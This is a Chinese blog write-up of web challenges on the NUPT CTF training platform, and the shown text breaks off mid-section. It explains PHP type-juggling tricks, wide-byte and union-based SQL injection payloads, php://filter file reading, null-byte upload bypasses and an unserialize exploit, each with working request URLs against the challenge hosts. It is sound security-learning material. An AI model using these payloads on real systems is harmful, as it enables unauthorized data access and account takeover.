<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>南京邮电大学网络攻防训练平台writeup | 闲言语</title><meta name=keywords content><meta name=description content="这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/170924nuptctfwp/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="南京邮电大学网络攻防训练平台writeup"><meta property="og:description" content="这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/170924nuptctfwp/"><meta property="article:section" content="post"><meta property="article:published_time" content="2017-09-24T11:06:34+08:00"><meta property="article:modified_time" content="2017-09-24T11:06:34+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="南京邮电大学网络攻防训练平台writeup"><meta name=twitter:description content="这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"南京邮电大学网络攻防训练平台writeup","item":"https://ret2neo.cn/post/170924nuptctfwp/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"南京邮电大学网络攻防训练平台writeup","name":"南京邮电大学网络攻防训练平台writeup","description":"这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。","keywords":[],"articleBody":" 南邮CTF平台网址：\nhttp://ctf.nuptsast.com/challenges http://ctf.nuptzj.cn/challenges WEB 签到题 nctf{flag_admiaanaaaaaaaaaaa}\nctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。\nmd5 collision nctf{md5_collision_is_easy}\n1 2 3 4 5 6 7 8 9 10 11 12 \u003c?php $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a)){ if ($a != 'QNKCDZO' \u0026\u0026 $md51 == $md52) { echo \"nctf{*****************}\"; } else { echo \"false!!!\"; }} else{echo \"please input a\";} ?\u003e 利用PHP弱类型，前人发现md5(‘QNKCDZO’)=‘0e830400451993494058024219903391’，md5(‘240610708’)=‘0e462097431906509019562988736854’，而因为使用松散比较的缘故，*var_dump(‘0e830400451993494058024219903391’==‘0e462097431906509019562988736854’);*值为真，因此访问 http://chinalover.sinaapp.com/web19/?a=240610708 即可。\n1、在PHP中，@被称为错误控制操作符(error control operator)，前置@符号的表达式产生的任何错误都将被忽略。\n2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。\n3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(type juggling)而后者不会。这种juggle总的来说利大于弊，但确实容易玩脱。\n​\t此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。\n​\t当操作符为==时，若有一个操作数为int/float或两个操作数is_numeric()均为真，则判断为处于数字语境；当操作符为数字操作符，如+-/*时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。）\n​\t根据PHP官方文档 ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【Valid numeric data ，正则匹配表达为 \\s(\\d+\\.?\\d*|\\.\\d+)([eE]\\d+)?\\s，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现1e也被取值为1而不是0，这有点奇怪 :(\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u003c?php $a1=1; $b1=\"1\"; $c1=\"1padding\"; $a2=.1; $b2=\".1\"; $c2=\".1padding\"; $a3=1.; $b3=\"1.\"; $c3=\"1.padding\"; $a4=1.1; $b4=\"1.1\"; $c4=\"1.1padding\"; $a5=1.e1; $b5=\"1.e1\"; $c5=\"1.e1padding\"; $a6=.1e1; $b6=\".1e1\"; $c6=\".1e1padding\"; $a7=1.1e1; $b7=\"1.1e1\"; $c7=\"1.1e1padding\"; $a8=1e1; $b8=\"1e1\"; $c8=\"1e1padding\"; var_dump($a8==$b8);//true var_dump($a8==$c8);//true var_dump($b8==$c8);//false var_dump($a8+$b8);//float(20) var_dump($a8+$c8);//float(20) var_dump($b8+$c8);//float(20) 4、其他符合/0[eE]\\d{30}/的MD5值：\nstring(strlen($var)) $var string(strlen(md5($var))) md5($var) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 签到2 1 2 3 4 5 6 7 8 9 \u003chtml\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /\u003e 尚未登录或口令错误 \u003cform action=\"./index.php\" method=\"post\"\u003e \u003cp\u003e输入框：\u003cinput type=\"password\" value=\"\" name=\"text1\" maxlength=\"10\"\u003e\u003cbr\u003e 请输入口令：zhimakaimen \u003cinput type=\"submit\" value=\"开门\"\u003e \u003c/form\u003e \u003c/html\u003e nctf{follow_me_to_exploit}\nmaxlength=“10” 而口令 zhimakaimen 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 maxlength=“10” 字段修改为 maxlength=“11” 或是更大的值；另一种是使用hackbar或burp直接向 http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php post text1=zhimakaimen 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。\n这题不是WEB nctf{photo_can_also_hid3_msg}\n下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。\n层层递进 nctf{this_is_a_fl4g}\n查看源代码，跟随链接，依次访问SO.html -\u003e S0.html-\u003eSO.htm -\u003eS0.htm-\u003e404.html ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。\nAAencode nctf{javascript_aaencode}\naaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 在线解码 。工具作者颇有幽默感。\n单身二十年 nctf{yougotit_script_now}\n访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包则可见flag。\n你从哪里来 你是从 google 来的吗？ 传送门：题目地址\nnctf{http_referer}\n给请求加上referer: https://www.google.com即可。从https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php 看到源代码可能有点问题。\n1 2 3 4 5 6 7 8 \u003c?php $referer = $_SERVER['referer']; if ($referer === \"https://www.google.com/ \" || $referer === \"https://www.google.com\"){ echo \"nctf{http_referer}\"; }else{ echo \"are you from google?\"; } ?\u003e 第二行应该是 $referer = $_SERVER['HTTP_REFERER']; ？\nphp decode 1 2 3 4 5 6 7 8 9 \u003c?php function CLsI($ZzvSWE) { $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i \u003c strlen($ZzvSWE); $i++) { $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); } return $ZzvSWE;} echo CLsI(\"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\"); nctf{gzip_base64_hhhhhh}\n运行代码即可。\n文件包含 nctf{edulcni_elif_lacol_si_siht}\n使用PHP的filter协议读取index.php，即访问 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php ，将得到的字符串base64解码。\n单身一百年也没用 nctf{this_is302redirect}\nflag藏在响应头中。\nDownload~! nctf{download_any_file_666}\n访问 http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。\nCOOKIE nctf{cookie_is_different_from_session}\n看到响应头中有Set-Cookie: Login=0，因此在请求头加入Cookie: Login=1即可。\nMYSQL nctf{query_in_mysql}\n根据提示查看robots.txt，内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 TIP:sql.php \u003c?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) { echo \"no! try again\n\"; } else{ echo($query[content]); } } ?\u003e 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把e当作科学计数法的一部分处理，所以可以提交id=1024e1等，如访问http://chinalover.sinaapp.com/web11/sql.php?id=1024e1。\n1、robots.txt可能藏有提示\n2、int intval ( mixed $var [, int $base = 10 ] )只取/\\d*/的部分。\nsql injection 3 nctf{gbk_3sqli}\n分别访问id=2和id=3得到提示gbk_sql_injection和the fourth table，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样：\n1 python sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6'\" -T ctf4 -C flag --dump 也可以手注：\n步骤一：确认该点存在注入 1 2 3 4 5 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2 和 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ 返回结果相同。 由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+ 经过转义变为id=2%d6%5c%27--+ ， 其中%d6%5c被合在一起解释，也就是id = '2Ö'-- 效果等价于 id = '2'--，但我们获得了执行sql的机会。 步骤二：查询数据库名 1 2 3 发现支持union查询 ， http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ ，之所以要加and+0+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为'sae-chinalover'。 步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字 1 2 3 4 5 6 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+ 得到目前的数据库含有5张表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+ 得到第四张表表名为'ctf4' MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。 limit用法是这样LIMIT {[offset,] row_count | row_count OFFSET offset}，必须放在where后面。 步骤四：查询表’ctf4’中的flag 1 2 3 4 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+ctf4--+ 发现该表只有一条记录 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,flag+from+ctf4--+ 猜测列名为flag，查询得到flag 附一个select查询语法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] /x00 nctf{use00to_jieduan}\n访问得到源码\n1 2 3 4 5 6 7 8 if (isset ($_GET['nctf'])) { if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; } 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到#biubiubiu ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交nctf=1%00%23biubiubiu即可。\n参考资料\n由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\\0标识字符串的结束）会忽略\"a NUL byte\"后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊搜了一下发现还有这么一些函数：\nint strcoll ( string $str1 , string $str2 ) Locale based string comparison (when current locale is not C or POSIX) public array TokyoTyrantTable::get ( mixed $keys ) Gets a row from table database. (version\u003e0.3.0) public Exception::__construct ([ string $message = \"\" [, int $code = 0 [, Throwable $previous = NULL ]]] ) Construct the exception 。其中对message的处理是非二进制安全的。 public Error::__construct ([ string $message = \"\" [, int $code = 0 [, Throwable $previous = NULL ]]] ) Construct the error object 。其中对message的处理是非二进制安全的。 bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] ) Sends an error message to the web server’s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.) bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] ) Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。 bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] ) Attaches a vendor specific string attribute 。$value是非二进制安全的。 string addcslashes ( string $str , string $charlist ) （存疑，似乎并不是） Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter. array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证） Read entire gz-file into an array 还有这些 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u003c?php $s=$_REQUEST['a']; // http://localhost/test.php?a=asd%00asdf $p='asdf'; var_dump(ereg_replace($p,'abcc',$s)); //string(3) \"asd\" var_dump(eregi_replace($p,'abcc',$s));//string(3) \"asd\" var_dump(ereg($p,$s));//bool(false) var_dump(eregi($p,$s));//bool(false) var_dump(split($p,$s));//array(1) { [0]=\u003e string(8) \"asd\\0asdf\" } var_dump(split($p,$s));//array(1) { [0]=\u003e string(8) \"asd\\0asdf\" } var_dump(sql_regcase($s)); //看起来没问题啊。。。string(29) \"[Aa][Ss][Dd]\\0[Aa][Ss][Dd][Ff]\" // ereg_replace — Replace regular expression // ereg — Regular expression match // eregi_replace — Replace regular expression case insensitive // eregi — Case insensitive regular expression match // split — Split string into array by regular expression // spliti — Split string into array by regular expression case insensitive // sql_regcase — Make regular expression for case insensitive match bypass again nctf{php_is_so_cool}\n访问得到源码\n1 2 3 4 5 6 7 if (isset($_GET['a']) and isset($_GET['b'])) { if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) === md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.'; } 源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即var_dump(md5(array(2))===null);值为bool(true) ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 http://chinalover.sinaapp.com/web17/index.php?a[]=\u0026b[]=1\n变量覆盖 nctf{bian_liang_fu_gai!}\nsource.php核心代码如下\n1 2 3 4 5 6 \u003c?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { extract($_POST); if ($pass == $thepassword_123) echo $theflag; } extract()函数原型为int extract(array \u0026$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]]) ，从数组中将变量导入当前符号表，$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。\nPHP是世界上最好的语言 nctf{php_is_best_language}\nindex.txt核心代码如下\n1 2 3 4 5 6 7 8 9 10 11 \u003c?php if(eregi(\"hackerDJ\",$_GET[id])) { echo(\"not allowed!\n\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"Access granted!\n\"; echo \"flag: *****************} \"; } 网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串，所以按照对照表编码，并将%编码为%25后提交，自动解码一次后%25变为%,代码中再解码一次后便得到flag。即访问 http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a 这是个二次编码的问题。\n伪装者 这是一个到处都有着伪装的世界 题目地址：点我\nnctf{happy_http_headers}\nreferer改了没用，据说请求头添加X-Forwarded-For: 127.0.0.1即可，没有成功，怀疑服务端代码有问题，可能是和你从哪里来那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。\nheader nctf{tips_often_hide_here}\n使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。\n上传绕过 题目地址：猜猜代码怎么写的\nnctf{welcome_to_hacks_world}\n当filename为1.jpg时返回如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Array ( [0] =\u003e .jpg [1] =\u003e jpg ) Upload: 1.jpg\u003cbr /\u003eType: text/plain\u003cbr /\u003eSize: 0.0078125 Kb\u003cbr /\u003eStored in: ./uploads/8a9e5f6a7a789acb.phparray(4) { [\"dirname\"]=\u003e string(9) \"./uploads\" [\"basename\"]=\u003e string(5) \"1.jpg\" [\"extension\"]=\u003e string(3) \"jpg\" [\"filename\"]=\u003e string(1) \"1\" } \u003cbr\u003e必须上传成后缀名为php的文件才行啊！\u003cbr\u003e\u003c/body\u003e 当filename为1.php时返回如下：\n1 2 3 4 5 6 Array ( [0] =\u003e .php [1] =\u003e php ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 观察源码为：\n1 2 3 4 5 6 7 8 9 文件上传\u003cbr\u003e\u003cbr\u003e \u003cform action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003clabel for=\"file\"\u003eFilename:\u003c/label\u003e \u003cinput type=\"hidden\" name=\"dir\" value=\"/uploads/\" /\u003e \u003cinput type=\"file\" name=\"file\" id=\"file\" /\u003e \u003cbr /\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"Submit\" /\u003e \u003c/form\u003e 因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改\n/uploads/为/uploads/1.php0x00，然后file保持1.jpg，连起来后就是/uploads/1.php%001.jpg，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。）\nsql注入1 听说你也会注入？ 地址： 题目地址\nnctf{ni_ye_hui_sql?}\n在 http://chinalover.sinaapp.com/index.phps 查看源码，核心部分如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u003c?php if($_POST[user] \u0026\u0026 $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo ''.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") { echo \"Logged in! flag:******************** \"; } if($query[user] != \"admin\") { echo(\"You are not admin!\n\"); } } echo $query[user]; 会对传入参数两端去空格，然后sql拼接如下\n$sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; ，\n所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式#注释到行尾，/*bla*/用于行间或多行注释，-- 也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\\s，也就是空格，TAB，换行符等。\n所以本题可post user=admin')-- -\u0026pass=123或user=admin')#\u0026pass=123，\nsql语句就变成select user from ctf where (user='admin')#' and (pw='123'),\n查询语句就能成功返回user列，值为admin的那条记录。\npass check nctf{strcmp_is_n0t_3afe}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u003c?php $pass=@$_POST['pass']; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) { if(@!strcmp($pass,$pass1)){ echo \"flag:nctf{*}\"; }else{ echo \"the pass is wrong!\"; } }else{ echo \"please input pass!\"; } ?\u003e 考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为pass[]=\n起名字真难 nctf{follow_your_dream}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u003c?php function noother_says_correct($number) { $one = ord('1'); $nine = ord('9'); for ($i = 0; $i \u003c strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit \u003e= $one) \u0026\u0026 ($digit \u003c= $nine) ) { return false; } } return $number == '54975581388'; } $flag='*******'; if(noother_says_correct($_GET['key'])) echo $flag; else echo 'access denied'; ?\u003e 要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc，\n因此访问 http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc\n密码重置 重置管理员账号：admin 的密码\n你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件：\n点击此链接重置您的密码\nnctf{reset_password_often_have_vuln\n修改重置链接的URL和POST中对应参数为admin相关的即可。\n即向 http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D post user=admin\u0026newpass=aaaaa\u0026vcode=1234 。\nphp反序列化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u003c?php class just4fun { var $enter; var $secret; } if (isset($_GET['pass'])) { $pass = $_GET['pass']; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-\u003esecret = \"*\"; if ($o-\u003esecret === $o-\u003eenter) echo \"Congratulation! Here is my secret: \".$o-\u003esecret; else echo \"Oh no... You can't fool me\"; } else echo \"are you trolling?\"; } 链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同，\n从官方文档看到这么一句\nCircular references inside the array/object you are serializing will also be stored，\n说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u003c?php class just4fun{ var $secret; var $enter ; } $f=new just4fun(); $f-\u003eenter=\u0026$f-\u003esecret; $sf=serialize($f); print_r($sf); $usf=unserialize($sf); echo ''; print_r($usf); 输出如下\nO:8:“just4fun”:2:{s:6:“secret”;N;s:5:“enter”;R:2;} just4fun Object ( [secret] =\u003e [enter] =\u003e )\n访问\nhttp://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}\n验证成功。\n别处看到flag为nctf{serialize_and_unserialize}\nsql injection4 继续注入吧~ 题目地址\nTIP:反斜杠可以用来转义 仔细查看相关函数的用法\nnctf{sql_injection_is_interesting}\n页面源代码注释中有SQL构造方式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #GOAL: login as admin,then get the flag; error_reporting(0); require 'db.inc.php'; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET['username']); $password = @clean((string)$_GET['password']); $query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';'; $result=mysql_query($query); if(!$result || mysql_num_rows($result) \u003c 1){ die('Invalid password!'); } echo $flag; 核心函数是htmlentities($str, ENT_QUOTES) ，函数原型是这样\n1 string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(\"default_charset\") [, bool $double_encode = true ]]] ) 参数flags缺省情况下与$flags=ENT_QUOTES情况下函数行为不同，\n选值为ENT_QUOTES时 Will convert both double and single quotes，\n也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。\n访问http://chinalover.sinaapp.com/web15/index.php?username=\\\u0026password=%20or%201%23，\n也就是构造payload为?username=\\\u0026password=%20or%201%23 ，使得查询语句如下：\n1 2 3 4 5 6 7 8 SELECT * FROM users WHERE name='\\' AND pass='%20or%201%23' 即 SELECT * FROM users WHERE name='\\' AND pass=' 『 [name]的值为 [' AND pass=] ，显然逻辑值为false 』 or 1 『 但没关系，[false or 1] 的逻辑值为真』 #' 『 注释掉多余的单引号 』 即 select * from users where false or 1 附：\n​\t具体编码方式可使用\nprint_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))查看，\n| ENT_COMPAT | ENT_HTML401 | ENT_QUOTES | | :————————: | :————-: | | [\u0026] =\u003e \u0026amp; | [\u0026] =\u003e \u0026amp; | | [\"] =\u003e \u0026quot; | [\"] =\u003e \u0026quot; | | [\u003c] =\u003e \u0026lt; | ['] =\u003e \u0026#039; | | [\u003e] =\u003e \u0026gt; | [\u003c] =\u003e \u0026lt; | | … | [\u003e] =\u003e \u0026gt; | | 共100个 | 共101个 |\n综合题 nctf{bash_history_means_what}\n1、访问链接得到一大段jsfuck代码，解码后得到document.write(\"1bc29b36f623ba82aaf6724fd3b16718.php\") ;\n2、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在HTTP响应头得到提示tip:history of bash;\n3、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ，看到页面内容为zip -r flagbak.zip ./* ;\n4、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 得到flag。\nsql 注入2 注入第二题~~主要考察union查询 传送门:点我带你飞\nntcf{union_select_is_wtf}\nindex/phps中有源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u003c?php if($_POST[user] \u0026\u0026 $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\")); if (($query[pw]) \u0026\u0026 (!strcasecmp($pass, $query[pw]))) { echo \"Logged in! Key: ntcf{**************} \"; } else { echo(\"Log in failure!\n\"); } } ?\u003e 因为\n1 2 var_dump(!strcasecmp(array(), $query[pw]));//bool(true) var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false) 所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的$user处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，mid()，if()和sleep()：\n1 2 3 4 5 6 MID(str,pos,len) /*需注意pos从1而不是0开始，Return a substring starting from the specified position*/ IF(expr1,expr2,expr3) /*If expr1 